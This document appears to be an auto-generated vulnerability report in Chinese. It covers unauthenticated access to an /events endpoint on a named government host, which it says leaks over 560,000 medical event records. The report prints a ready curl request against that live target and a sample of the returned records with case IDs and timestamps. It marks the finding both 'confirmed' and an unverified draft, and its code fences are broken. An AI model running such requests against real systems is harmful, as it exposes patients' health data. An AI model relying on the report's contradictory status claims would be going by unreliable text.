# POC/EXP — 4001 端口 /events 端点未授权访问 - 泄露 56 万条医疗事件数据

> 漏洞ID: `70af2978-1332-4e62-8c5b-05c4012f0119`  | 嚴重度: **high** | 狀態: confirmed | 目標: `https://epcr.tpf.gov.tw:4001/events`

**類型**: Information Disclosure

## 描述

GET /events 端点无需任何认证即可访问，返回 567201 条医疗事件数据（JSON 数组），包含 CaseID、recordUuid、时间戳、类型、生命体征（血压）等敏感信息。数据涵盖 2018 年至今的 PCDT（运动压力测试）记录。

## POC / 復現步驟

```
--- retest 2026-08-31 ---
2026-08-31 整理：并入 81918f6b。
```
$ curl -sk "https://epcr.tpf.gov.tw:4001/events?range=0-10"
HTTP/1.1 200 OK
content-range: items 0-99/567201
content-type: application/json; charset=utf-8
content-length: 47786

[{"id":2,"CaseID":"180717152801fed7","recordUuid":"Test180805142701","Caption":"End of PCDT","TypeOfEventTxt":"endofPCDT","TypeOfEventNum":"433","Elapsed":1059221,"Timestamp":"2018-07-17T07:45:40.000Z","Value":null,"Unit":null,"Systolic":null,"Diastolic":null,"Mean":null,"BPUnit":null,"ExceededAbove":null,"AlarmedBPTypeTxt":null,"AlarmedBPTypeNum":null,"LimitValue":null,"LimitUnit":null,"Annotation":null,"createdAt":"2018-08-14T09:48:14.000Z","updatedAt":"2018-08-14T09:48:14.000Z"},...]
```

关键泄露字段：
- **CaseID**: 病例 ID（如 180717152801fed7）
- **recordUuid**: 记录 UUID（如 Test180805142701）
- **Timestamp**: 事件时间戳（2018-07-17T07:45:40.000Z）
- **TypeOfEventTxt**: 事件类型（startofPCDT、endofPCDT、mark、learningRhythm）
- **Systolic/Diastolic/Mean**: 收缩压/舒张压/平均压
- **Elapsed**: 持续时间（毫秒）
- **createdAt/updatedAt**: 创建/更新时间
```

---

## 驗證要點

- [ ] 僅在授權範圍內驗證
- [ ] 最小化請求逐步驗證,留存原始請求/回應
- [ ] 失敗需記錄負結果,避免誤報
- [ ] 未實際驗證前狀態不得改為 confirmed

> 本文件由 JySecAI 自動生成,狀態:**草稿(未驗證)**
